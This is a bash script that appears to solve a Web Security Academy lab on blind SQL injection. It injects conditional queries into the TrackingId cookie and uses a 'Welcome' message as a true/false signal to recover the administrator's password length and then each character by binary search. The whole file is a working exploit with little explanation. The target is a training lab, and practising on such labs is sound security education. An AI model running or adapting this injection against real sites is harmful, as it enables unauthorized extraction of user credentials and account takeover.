#!/bin/bash

if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain"
	exit 1;
fi
url="https://$1.web-security-academy.net"

function check {
	res=$(curl -s -b "TrackingId=' OR (SELECT 'a' WHERE (SELECT COUNT(*)>0 FROM users WHERE username='administrator' AND $1))='a" "$url/filter?category=Gifts");
	lines=$(echo "$res" | wc -l);
	echo 'Response lines: '$lines;
	found=$(echo "$res" | grep 'Welcome' >/dev/null && echo true || echo false);
	echo 'Truthy response: '$found;
	echo "$res" | grep 'Welcome' > /dev/null
}

passwordLen=20;
until check "LENGTH(password)=$passwordLen"; do
	passwordLen=$((passwordLen+1));
done
echo "Password length for admin user: $passwordLen";

password="";
max=255;
min=0;
index=1;
ord=1;

until [[ $index -gt $passwordLen ]]; do	
    max=255;
    min=0;
    ord=$((max + min));
    ord=$((ord / 2));
    until check "ASCII(SUBSTRING(password, $index, 1)) = $ord"; do
            ord=$((max + min));
            ord=$((ord / 2));
	    echo "Checking index $index ord $ord";
	    if check "ASCII(SUBSTRING(password, $index, 1)) > $ord"; then
		    min=$ord;
	    else
		    max=$ord;
	    fi
    done
    password="$password\\$ord";
    ord=1;
    echo $password;
    index=$((index+1));
done
echo "Password: $password";

echo "Use https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html to convert decimal to ascii"
